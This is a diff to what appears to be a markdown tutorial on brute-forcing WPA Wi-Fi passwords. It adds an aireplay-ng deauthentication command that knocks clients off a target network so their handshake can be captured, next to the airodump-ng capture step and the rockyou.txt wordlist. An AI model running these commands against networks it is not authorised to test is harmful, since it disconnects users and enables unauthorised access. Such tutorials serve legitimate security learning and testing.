@@ -134,6 +134,12 @@ sudo airodump-ng wlan0mon
 ```
 
 #### Step 3 : Capture Handshake
+To capture the Handshake, we need first to deauthenticate the user and when he tries to reauthenticate we will be able to capture the Handshake.
+To deauthenticate users from the target WIFI network, we need to run this command :
+```
+sudo aireplay-ng --deauth 100 -a [BSSID] wlan0mon --ignore-negative-one
+```
+
 Before initiating the Brute Force attack, capture the handshake of the target WPA Wi-Fi network using a tool like Airodump-ng:
 ```
 airodump-ng wlan0 --channel [channel_number] --bssid [BSSID] -w capture_file
@@ -147,7 +153,6 @@ Configure the selected Brute Force tool to target the captured handshake file an
 We need first to have the dictionnary that will be used during the attack.
 ```
 wordlists
-
 ```
 and then put y to extract the wordlist rockyou.txt
 
